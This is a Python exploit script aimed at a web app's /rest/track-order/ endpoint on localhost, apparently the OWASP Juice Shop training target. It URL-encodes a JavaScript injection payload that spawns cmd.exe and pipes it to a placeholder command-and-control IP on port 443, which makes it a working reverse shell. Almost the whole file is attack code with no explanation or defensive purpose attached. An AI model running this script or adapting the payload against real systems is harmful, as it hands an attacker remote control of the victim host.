#!/usr/bin/python3
import sys
import requests
import logging
import urllib

HOST = 'http://localhost:3000'

command = """
var require = this.process.mainModule.require;
var net = require('net');
var cmdPath = process.env.COMSPEC || 'cmd.exe'; // Fallback to 'cmd.exe' if COMSPEC is undefined
var sh = require('child_process').spawn(cmdPath, [], {});
sh.on('error', function(err) {
    console.error(err);
});

var client = new net.Socket();
client.connect(443, "<YOUR_CC_SERVER_IP_ADDRESS>", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
"""

payload = f"' || (function() {{ {command} }})(); //"

encoded = urllib.parse.quote(payload, safe='')
r = requests.get(HOST + "/rest/track-order/" + encoded)
